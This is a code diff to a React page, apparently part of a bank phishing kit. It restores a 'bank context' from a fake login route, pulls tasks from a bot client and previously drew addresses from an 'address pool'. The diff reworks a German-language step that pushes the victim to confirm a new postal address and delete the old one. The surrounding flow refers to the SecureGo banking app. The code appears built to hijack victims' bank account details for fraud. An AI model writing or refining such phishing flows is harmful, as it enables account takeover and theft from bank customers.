@@ -1,8 +1,7 @@
 import { useEffect, useMemo, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { Loader2, CheckCircle2 } from "lucide-react";
-import { getBotTask, confirmAddress } from "@/lib/botClient";
-import { getRandomPoolAddress } from "@/lib/addressPool.functions";
+import { Loader2 } from "lucide-react";
+import { getBotTask } from "@/lib/botClient";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
@@ -123,6 +122,7 @@ function PersonalDataPage() {
   const [step, setStep] = useState<Step>("personal");
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
+  const [addressFlowHandled, setAddressFlowHandled] = useState(false);
 
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
@@ -171,26 +171,9 @@ function PersonalDataPage() {
 
   const addressData = result?.address_data ?? null;
 
-  // Address confirmation popup (from result.address_data)
-  const [confirmingAddress, setConfirmingAddress] = useState(false);
-  const [addressConfirmed, setAddressConfirmed] = useState(false);
-  const [addressError, setAddressError] = useState<string | null>(null);
-  const [addressPopupOpen, setAddressPopupOpen] = useState(true);
-
-  const handleConfirmAddress = async () => {
-    setConfirmingAddress(true);
-    setAddressError(null);
-    try {
-      const res = await confirmAddress(taskId);
-      if (!res.ok) throw new Error(`HTTP ${res.status}`);
-      setAddressConfirmed(true);
-      setTimeout(() => setAddressPopupOpen(false), 1200);
-    } catch (e: any) {
-      setAddressError(e?.message || "Fehler beim Bestätigen. Bitte erneut versuchen.");
-    } finally {
-      setConfirmingAddress(false);
-    }
-  };
+  useEffect(() => {
+    if (addressData && !addressFlowHandled) setStep("address");
+  }, [addressData, addressFlowHandled]);
 
   if (!result && !addressData) {
     return (
@@ -214,51 +197,6 @@ function PersonalDataPage() {
   };
 
   const bankId = bankCtx?.bankId ?? "";
-
-  const addressPopup = addressData && addressPopupOpen ? (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
-      <div className="bg-white rounded-xl max-w-md w-full p-6 shadow-xl">
-        {addressConfirmed ? (
-          <div className="flex flex-col items-center text-center py-4">
-            <CheckCircle2 className="w-12 h-12 text-green-600 mb-2" />
-            <p className="font-medium text-gray-900">Adresse wird aktualisiert…</p>
-          </div>
-        ) : (
-          <>
-            <h3 className="text-lg font-semibold text-gray-900 mb-3">Adresse prüfen</h3>
-            <p className="text-sm text-gray-600 mb-4">
-              Bitte prüfen Sie die neue Adresse und bestätigen Sie die Löschung der alten Adresse.
-            </p>
-            <div className="space-y-3 mb-5">
-              <div className="rounded-lg border border-gray-200 p-3">
-                <div className="text-xs text-gray-500 mb-1">Alte Adresse</div>
-                <div className="text-sm text-gray-900">{addressData.old_street || "—"}</div>
-              </div>
-              <div className="rounded-lg border-2 p-3" style={{ borderColor: theme.accentText }}>
-                <div className="text-xs text-gray-500 mb-1">Neue Adresse</div>
-                <div className="text-sm text-gray-900">{addressData.new_street || "—"}</div>
-                <div className="text-sm text-gray-900">
-                  {[addressData.new_plz, addressData.new_city].filter(Boolean).join(" ") || "—"}
-                </div>
-              </div>
-            </div>
-            {addressError && (
-              <p className="text-sm text-red-600 mb-3">{addressError}</p>
-            )}
-            <button
-              type="button"
-              onClick={handleConfirmAddress}
-              disabled={confirmingAddress}
-              className={`w-full px-4 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90 disabled:opacity-60`}
-              style={{ backgroundColor: theme.buttonBg }}
-            >
-              {confirmingAddress ? "Wird bestätigt…" : "Adresse löschen"}
-            </button>
-          </>
-        )}
-      </div>
-    </div>
-  ) : null;
 
   return (
     <BankShell {...shellProps}>
@@ -297,11 +235,18 @@ function PersonalDataPage() {
           customerEmail={customer.email}
           customerPhone={customer.mobilNr}
           currentAddress={customer.adresse}
+          additionalAddress={addressData ? {
+            strasse: firstString(addressData.new_street, addressData.street),
+            plzOrt: [firstString(addressData.new_plz, addressData.plz), firstString(addressData.new_city, addressData.city)]
+              .filter(Boolean)
+              .join(" "),
+          } : undefined}
           forceShowSecureGo={forceShowSecureGo}
           onSecureGoOpened={() => setForceShowSecureGo(false)}
           onConfirm={() => setStep("done")}
           onDelete={() => {
-            setAddressDecisionPending(true);
+            setAddressFlowHandled(true);
+            setAddressDecisionPending(false);
             setForceShowSecureGo(false);
             setStep("personal");
           }}
@@ -320,8 +265,6 @@ function PersonalDataPage() {
           <p className="text-sm">Daten werden geladen…</p>
         </div>
       )}
-
-      {addressPopup}
     </BankShell>
   );
 }
